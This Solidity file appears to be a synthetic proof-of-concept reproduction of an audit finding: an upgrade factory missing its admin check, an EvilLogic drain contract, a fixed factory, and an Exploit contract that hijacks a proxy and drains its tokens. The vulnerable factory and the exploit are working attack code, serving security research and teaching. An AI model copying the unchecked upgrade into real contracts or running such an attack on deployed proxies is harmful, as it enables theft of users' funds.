// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Curra ERC1967Factory — upgrade and upgradeAndCall no longer check admin
    (Zokyo, Curra, finding 37160).

    SYNTHETIC, cheatcode-free reduction. The report says the admin check was
    removed and both functions are public, so anyone can point a proxy at a
    new implementation. The attacker upgrades and drains the proxy's tokens.

    run() does not warp. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VaultProxy {
    address public factory;
    address public implementation;
    Asset public token;

    constructor(address factory_, Asset token_) {
        factory = factory_;
        token = token_;
    }

    function upgradeTo(address nextImpl) external {
        require(msg.sender == factory, "factory");
        implementation = nextImpl;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

contract EvilLogic {
    address public factory;
    address public implementation;
    Asset public token;
    address public admin;

    function drain(address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }
}

contract ERC1967Factory {
    address public adminOfProxy;

    function setAdmin(address admin_) external {
        require(adminOfProxy == address(0), "admin");
        adminOfProxy = admin_;
    }

    function upgrade(address proxy, address implementation) public payable {
        upgradeAndCall(proxy, implementation, "");
    }

    function upgradeAndCall(address proxy, address implementation, bytes memory data) public payable {
        // @> VULN: the proxy admin is not checked; anyone may replace the implementation
        VaultProxy(payable(proxy)).upgradeTo(implementation);
        if (data.length > 0) {
            (bool ok,) = proxy.call(data);
            require(ok, "call");
        }
    }
}

contract ERC1967FactoryFixed {
    address public adminOfProxy;

    constructor(address admin_) {
        adminOfProxy = admin_;
    }

    function upgradeAndCall(address proxy, address implementation, bytes memory data) public payable {
        require(msg.sender == adminOfProxy, "admin");
        VaultProxy(payable(proxy)).upgradeTo(implementation);
        if (data.length > 0) {
            (bool ok,) = proxy.call(data);
            require(ok, "call");
        }
    }
}

contract Exploit {
    uint256 public constant STOLEN = 1000 ether;

    Asset public token;
    ERC1967Factory public factory;
    VaultProxy public proxy;
    EvilLogic public evil;
    uint256 public drained;

    constructor() {
        token = new Asset();
        factory = new ERC1967Factory();
        proxy = new VaultProxy(address(factory), token);
        evil = new EvilLogic();
        factory.setAdmin(address(0xBEEF));
        token.mint(address(proxy), STOLEN);
    }

    function run() external {
        factory.upgradeAndCall(address(proxy), address(evil), abi.encodeWithSelector(EvilLogic.drain.selector, address(this)));
        drained = token.balanceOf(address(this));
        require(proxy.implementation() == address(evil), "impl");
        require(drained == STOLEN, "drained");
        require(token.balanceOf(address(proxy)) == 0, "proxy empty");
        require(factory.adminOfProxy() != address(this), "not admin");
    }
}
